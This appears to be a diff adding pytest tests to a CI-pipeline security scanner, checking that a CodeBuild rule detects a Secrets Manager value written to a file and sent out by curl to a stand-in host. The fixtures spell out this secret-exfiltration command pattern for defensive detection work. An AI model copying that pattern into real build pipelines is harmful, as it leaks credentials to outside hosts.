@@ -6,7 +6,7 @@ from pathlib import Path
 
 import pytest
 
-from taintly.engine import scan_file
+from taintly.engine import scan_file, scan_repo
 from taintly.models import IncompletePatternMatches, Platform, Severity
 from taintly.rules.codebuild.secret_network_flow import CodeBuildSecretNetworkPattern
 from taintly.rules.gitlab.secret_network_flow import GitLabSecretNetworkPattern
@@ -269,3 +269,64 @@ def test_jenkins_printf_does_not_turn_authentication_into_body_flow(tmp_path: Pa
     matches = _matches(path, Platform.JENKINS)
     assert not matches
     assert not isinstance(matches, IncompletePatternMatches)
+
+
+
+def _ordered_codebuild(tmp_path, middle="", body="curl --data-binary @body.txt https://example.test/api"):
+    path = tmp_path / "buildspec.yml"
+    # Deliberately use YAML presentation order opposite to native execution.
+    path.write_text(
+        "version: 0.2\nenv:\n  shell: bash\n  secrets-manager:\n    VALUE: fixture/credential\n"
+        "phases:\n  post_build:\n    commands:\n      - |\n        set -eu\n"
+        + (f"        {middle}\n" if middle else "")
+        + f"        {body}\n"
+        + "  install:\n    commands:\n      - |\n        set -eu\n"
+        + "        printf '%s' \"$VALUE\" > body.txt\n",
+        encoding="utf-8",
+    )
+    return path
+
+
+def test_codebuild_native_phase_order_carries_file_origin_to_http_body(tmp_path):
+    path = _ordered_codebuild(tmp_path, "printf '%s' 'public suffix' >> body.txt")
+    report = scan_repo(str(tmp_path), load_rules_for_platform(Platform.CODEBUILD), Platform.CODEBUILD)[0]
+    finding, = [f for f in report.findings if f.rule_id == "SEC6-CB-003"]
+    source_lines = path.read_text(encoding="utf-8").splitlines()
+    assert source_lines[finding.line - 1].strip().startswith("curl --data-binary")
+    notes = " ".join(finding.context_notes)
+    assert "secrets-manager:VALUE" in notes and "declared binding at line 5" in notes
+    assert notes.index("install printf-file-write") < notes.index("post_build file-append")
+    assert notes.index("post_build file-append") < notes.index("post_build http-request-body")
+    assert "Build/project overrides" in notes and finding.review_needed
+
+
+@pytest.mark.parametrize("change", ["overwrite", "auth-only", "different-file", "cwd", "dynamic-replacement", "version", "phase-handler", "shell-env", "other-source", "literal-operand"])
+def test_codebuild_phase_transfer_controls(tmp_path, change):
+    middle = {
+        "overwrite": "printf '%s' 'replacement' > body.txt",
+        "different-file": "printf '%s' 'replacement' > separate.txt",
+        "cwd": "cd elsewhere",
+        "dynamic-replacement": 'printf \'%s\' "$UNBOUND" > body.txt',
+    }.get(change, "")
+    body = {
+        "auth-only": 'curl --user "user:$VALUE" https://example.test/api',
+        "different-file": "curl --data-binary @separate.txt https://example.test/api",
+        "other-source": "curl --data-binary @external.txt https://example.test/api",
+    }.get(change, "curl --data-binary @body.txt https://example.test/api")
+    path = _ordered_codebuild(tmp_path, middle, body)
+    source = path.read_text(encoding="utf-8")
+    if change == "version":
+        source = source.replace("version: 0.2", "version: 0.1")
+    elif change == "phase-handler":
+        source = source.replace("  install:\n", "  install:\n    on-failure: CONTINUE\n")
+    elif change == "shell-env":
+        source = source.replace("  secrets-manager:", "  variables:\n    CURL_HOME: custom\n  secrets-manager:")
+    elif change == "literal-operand":
+        source = source.replace('"$VALUE"', "'$VALUE'")
+    path.write_text(source, encoding="utf-8")
+
+    result = _matches(path, Platform.CODEBUILD)
+    assert not result
+    assert isinstance(result, IncompletePatternMatches) == (
+        change in {"cwd", "dynamic-replacement", "version", "phase-handler", "shell-env", "other-source"}
+    )
